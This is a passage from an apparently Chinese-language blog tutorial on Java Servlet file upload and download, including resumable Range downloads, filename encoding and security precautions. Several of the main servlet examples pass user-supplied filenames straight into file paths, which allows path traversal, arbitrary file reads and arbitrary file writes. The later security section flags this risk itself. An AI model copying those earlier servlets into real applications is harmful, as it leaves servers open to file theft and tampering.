href="#1-2-基于Servlet-3-0-MultipartConfig实现" class="headerlink" title="1.2 基于Servlet 3.0+ @MultipartConfig实现"></a>1.2 基于Servlet 3.0+ @MultipartConfig实现</h3><p>Servlet 3.0及以上版本提供了内置的文件上传支持，无需额外的库。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload&quot;)</span></span><br><span class="line"><span class="meta">@MultipartConfig(</span></span><br><span class="line"><span class="meta">        fileSizeThreshold = 1024 * 1024, // 1 MB</span></span><br><span class="line"><span class="meta">        maxFileSize = 1024 * 1024 * 10,  // 10 MB</span></span><br><span class="line"><span class="meta">        maxRequestSize = 1024 * 1024 * 15, // 15 MB</span></span><br><span class="line"><span class="meta">        location = &quot;/tmp&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取文件存储路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 解析请求，获取所有上传的文件</span></span><br><span class="line">            Collection&lt;Part&gt; parts = request.getParts();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (Part part : parts) &#123;</span><br><span class="line">                <span class="comment">// 获取请求头中的Content-Disposition字段</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> part.getHeader(<span class="string">&quot;content-disposition&quot;</span>);</span><br><span class="line">                <span class="comment">// 从请求头中提取文件名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> extractFileName(header);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 排除非文件字段</span></span><br><span class="line">                <span class="keyword">if</span> (fileName != <span class="literal">null</span> &amp;&amp; !fileName.isEmpty()) &#123;</span><br><span class="line">                    <span class="comment">// 写入文件</span></span><br><span class="line">                    part.write(uploadPath + File.separator + fileName);</span><br><span class="line">                    out.println(<span class="string">&quot;&lt;h2&gt;文件 &quot;</span> + fileName + <span class="string">&quot; 上传成功!&lt;/h2&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;&lt;h2&gt;文件上传失败: &quot;</span> + e.getMessage() + <span class="string">&quot;&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">extractFileName</span><span class="params">(String header)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (header == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 从content-disposition头中提取文件名</span></span><br><span class="line">        <span class="comment">// 格式: form-data; name=&quot;file&quot;; filename=&quot;example.jpg&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (String token : header.split(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (token.trim().startsWith(<span class="string">&quot;filename&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 提取文件名并去除引号</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> token.substring(token.indexOf(<span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>).trim().replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="comment">// 如果是IE浏览器，获取真实的文件名</span></span><br><span class="line">                <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">                    fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;\\&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> fileName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="1-3-前端表单示例"><a href="#1-3-前端表单示例" class="headerlink" title="1.3 前端表单示例"></a>1.3 前端表单示例</h3><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        选择文件: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="2-文件下载实现"><a href="#2-文件下载实现" class="headerlink" title="2. 文件下载实现"></a>2. 文件下载实现</h2><h3 id="2-1-基本下载实现"><a href="#2-1-基本下载实现" class="headerlink" title="2.1 基本下载实现"></a>2.1 基本下载实现</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取要下载的文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.isEmpty()) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;文件名不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取文件存储路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath + fileName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!file.exists() || file.isDirectory()) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + fileName + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        response.setContentLengthLong(file.length());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出文件内容</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">             <span class="type">ServletOutputStream</span> <span class="variable">sos</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                sos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="2-2-处理中文文件名"><a href="#2-2-处理中文文件名" class="headerlink" title="2.2 处理中文文件名"></a>2.2 处理中文文件名</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>) + fileName;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">            <span class="comment">// 处理中文文件名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">            String encodedFilename;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 根据不同浏览器进行不同的编码</span></span><br><span class="line">            <span class="keyword">if</span> (userAgent.contains(<span class="string">&quot;MSIE&quot;</span>) || userAgent.contains(<span class="string">&quot;Trident&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// IE浏览器</span></span><br><span class="line">                encodedFilename = URLEncoder.encode(fileName, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userAgent.contains(<span class="string">&quot;Firefox&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// Firefox浏览器</span></span><br><span class="line">                encodedFilename = <span class="string">&quot;=?UTF-8?B?&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(fileName.getBytes(<span class="string">&quot;UTF-8&quot;</span>))) + <span class="string">&quot;?=&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Chrome、Safari等其他浏览器</span></span><br><span class="line">                encodedFilename = URLEncoder.encode(fileName, <span class="string">&quot;UTF-8&quot;</span>).replaceAll(<span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%20&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 设置响应头</span></span><br><span class="line">            response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + encodedFilename + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            response.setContentLengthLong(file.length());</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 输出文件</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">                 <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(in);</span><br><span class="line">                 <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">                <span class="type">int</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="2-3-大文件下载处理"><a href="#2-3-大文件下载处理" class="headerlink" title="2.3 大文件下载处理"></a>2.3 大文件下载处理</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download-large&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LargeFileDownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>) + fileName;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取Range头，支持断点续传</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">range</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Range&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> file.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isPartialContent</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (range != <span class="literal">null</span> &amp;&amp; range.startsWith(<span class="string">&quot;bytes=&quot;</span>)) &#123;</span><br><span class="line">            isPartialContent = <span class="literal">true</span>;</span><br><span class="line">            String[] ranges = range.substring(<span class="string">&quot;bytes=&quot;</span>.length()).split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            start = Long.parseLong(ranges[<span class="number">0</span>]);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (ranges.length &gt; <span class="number">1</span> &amp;&amp; !ranges[<span class="number">1</span>].isEmpty()) &#123;</span><br><span class="line">                end = Long.parseLong(ranges[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算实际需要传输的数据长度</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">contentLength</span> <span class="operator">=</span> end - start + <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        <span class="keyword">if</span> (isPartialContent) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_PARTIAL_CONTENT); <span class="comment">// 206</span></span><br><span class="line">            response.setHeader(<span class="string">&quot;Content-Range&quot;</span>, <span class="string">&quot;bytes &quot;</span> + start + <span class="string">&quot;-&quot;</span> + end + <span class="string">&quot;/&quot;</span> + file.length());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_OK); <span class="comment">// 200</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + fileName + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        response.setContentLengthLong(contentLength);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出文件内容</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">             <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            raf.seek(start);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 计算剩余需要传输的字节数</span></span><br><span class="line">            <span class="type">long</span> <span class="variable">remaining</span> <span class="operator">=</span> contentLength;</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (remaining &gt; <span class="number">0</span> &amp;&amp; (len = raf.read(buffer, <span class="number">0</span>, (<span class="type">int</span>)Math.min(buffer.length, remaining))) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                remaining -= len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="3-文件上传下载的注意事项"><a href="#3-文件上传下载的注意事项" class="headerlink" title="3. 文件上传下载的注意事项"></a>3. 文件上传下载的注意事项</h2><h3 id="3-1-上传相关注意事项"><a href="#3-1-上传相关注意事项" class="headerlink" title="3.1 上传相关注意事项"></a>3.1 上传相关注意事项</h3><ol><li><p><strong>文件大小限制</strong>：设置合理的文件大小限制，防止服务器资源被耗尽。</p></li><li><p><strong>文件类型验证</strong>：验证上传文件的类型，避免恶意文件被上传。</p></li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件类型验证</span></span><br><span class="line"><span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> part.getContentType();</span><br><span class="line"><span class="keyword">if</span> (contentType != <span class="literal">null</span> &amp;&amp; !contentType.startsWith(<span class="string">&quot;image/&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;仅允许上传图片文件!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ol start="3"><li><strong>文件名安全处理</strong>：避免使用用户提供的原始文件名，可以使用UUID重命名文件。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成唯一文件名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">originalFileName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(item.getName()).getName();</span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> UUID.randomUUID().toString() + extension;</span><br></pre></td></tr></table></figure></div><ol start="4"><li><strong>防止目录遍历攻击</strong>：验证文件名，确保不包含路径分隔符。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证文件名</span></span><br><span class="line"><span class="keyword">if</span> (fileName.contains(<span class="string">&quot;..&quot;</span>) || fileName.contains(<span class="string">&quot;/&quot;</span>) || fileName.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;非法的文件名&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="3-2-下载相关注意事项"><a href="#3-2-下载相关注意事项" class="headerlink" title="3.2 下载相关注意事项"></a>3.2 下载相关注意事项</h3><ol><li><strong>文件路径安全</strong>：避免通过参数直接指定下载文件的路径，防止路径遍历漏洞。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不安全的写法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">insecurePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(insecurePath); <span class="comment">// 危险！可能导致任意文件读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全的写法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"><span class="comment">// 验证文件名是否合法</span></span><br><span class="line"><span class="keyword">if</span> (fileName.contains(<span class="string">&quot;..&quot;</span>) || fileName.contains(<span class="string">&quot;/&quot;</span>) || fileName.contains(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;非法的文件名&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">securePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/downloads/&quot;</span>) + fileName;</span><br></pre></td></tr></table></figure></div><ol start="2"><li><strong>下载权限控制</strong>：确保用户有权限下载请求的文件。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例：检查用户权限</span></span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user == <span class="literal">null</span> || !hasDownloadPermission(user, fileName)) &#123;</span><br><span class="line">    response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;没有权限下载此文件&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ol start="3"><li><strong>文件类型检测</strong>：根据文件类型设置正确的Content-Type。</li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据文件扩展名设置Content-Type</span></span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>).toLowerCase();</span><br><span class="line"><span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> <span class="string">&quot;application/octet-stream&quot;</span>; <span class="comment">// 默认二进制流</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (extension) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;pdf&quot;</span>:</span><br><span class="line">        contentType = <span class="string">&quot;application/pdf&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;jpg&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;jpeg&quot;</span>:</span><br><span class="line">        contentType = <span class="string">&quot;image/jpeg&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;png&quot;</span>:</span><br><span class="line">        contentType = <span class="string">&quot;image/png&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 其他文件类型...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response.setContentType(contentType);</span><br></pre></td></tr></table></figure></div><h2 id="4-最佳实践"><a href="#4-最佳实践" class="headerlink" title="4. 最佳实践"></a>4. 最佳实践</h2><h3 id="4-1-使用进度条显示上传-x2F-下载进度"><a href="#4-1-使用进度条显示上传-x2F-下载进度" class="headerlink" title="4.1 使用进度条显示上传&#x2F;下载进度"></a>4.1 使用进度条显示上传&#x2F;下载进度</h3><p>前端JavaScript代码示例：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;uploadForm&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;uploadFile()&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;progress&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;progress-bar&quot;</span> <span class="attr">id</span>=<span class="string">&quot;progressBar&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 0%;&quot;</span>&gt;</span>0%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span 